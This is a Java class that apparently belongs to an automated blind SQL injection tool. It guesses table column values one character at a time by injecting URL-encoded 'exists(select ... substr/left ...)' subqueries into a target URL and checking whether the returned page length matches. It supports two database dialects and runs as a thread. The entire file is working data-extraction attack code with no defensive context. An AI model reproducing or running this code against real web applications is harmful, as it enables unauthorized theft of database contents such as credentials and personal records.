package com.sql;

import java.util.ArrayList;
import java.util.List;

public class GuessValue implements Runnable {
	char[] charSet = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a',
			'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
			'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'/*, 'A',
			'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
			'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'*/, '~',
			'!', '@', '#', '$', '^', '&', '*', '(', ')', '-', '_', '=', ',',
			'.', '/', '\\', '<', '>', '?', ':', ';' };
	public String url;
	public int indexOfNumberInjection;
	public int indexOfCharInjection;
	public String tableName;
	public String columnName;
	public int len;
	public String urlHead;
	public String urlEnd;
	public int DBType;
	public List<String> list;
	private GetColumnValue getColumnValue;
	private List<String> allValue;
	private int contentLen;

	@Override
	public void run() {
		// TODO Auto-generated method stub
		int i = 1;
		list = getFirst();
		if (!list.isEmpty())
			while (i < len) {
				list = getOther(list);
				i++;
			}
		for (int j = 0; j < list.size(); j++) {
			allValue.add(list.get(j));
		}
		getColumnValue.active--;
	}

	public GuessValue(String url, String columnName, String tableName, int len,
			String urlHead, String urlEnd, int DBType, List<String> list,
			GetColumnValue getColumnValue, List<String> allValue) {
		this.DBType = DBType;
		this.url = url;
		this.urlHead = urlHead;
		this.urlEnd = urlEnd;
		this.tableName = tableName;
		this.columnName = columnName;
		this.len = len;
		this.list = list;
		this.getColumnValue = getColumnValue;
		this.allValue = allValue;
		this.contentLen = IsExistInjection.getContent(this.url).length();
	}

	public List<String> getOther(List<String> s) {
		List<String> list = new ArrayList<String>();
		for (int i = 0; i < s.size(); i++) {
			String tmp;
			String testUrl;
			for (int j = 0; j < charSet.length; j++) {
				tmp = s.get(i) + charSet[j];
				testUrl = connectStr(tmp.length(), turnToAsc(tmp)); // 遍历数组，找匹配字符串，直到长度为Len
				if (IsExistInjection.isRightPage(this.contentLen, testUrl))
					list.add(tmp);
			}
		}
		return list;
	}

	public List<String> getFirst() {

		List<String> list = new ArrayList<String>();
		String testUrl;
		for (int j = 0; j < charSet.length; j++) {
			String str = "";
			str += charSet[j];

			testUrl = connectStr(1, turnToAsc(str));
			if (IsExistInjection.isRightPage(this.contentLen, testUrl)) {
				list.add(str);
			}
		}
		return list;
	}

	public String connectStr(int i, String s) {
		String testurl = null;

		if (DBType == 0 || DBType == 2) {
			testurl = urlHead + "exists(select%20" + this.columnName
					+ "%20from%20" + this.tableName + "%20where%20substr("
					+ this.columnName + ",1," + i + ")" + "%20=%20'" + s
					+ "'%20and%20length(" + this.columnName + ")=" + this.len
					+ ")" + urlEnd;
		} else {
			testurl = urlHead + "exists(select%20" + this.columnName
					+ "%20from%20" + this.tableName + "%20where%20left("
					+ this.columnName + "," + i + ")='" + s + "'%20and%20len("
					+ this.columnName + ")=" + this.len + ")" + urlEnd;

		}
		return testurl;
	}

	public String turnToAsc(String str) {
		char s[] = str.toCharArray();
		String ss = "";
		for (int i = 0; i < s.length; i++)
			ss = ss + "%" + Integer.toHexString(s[i]);
		return ss;
	}
}
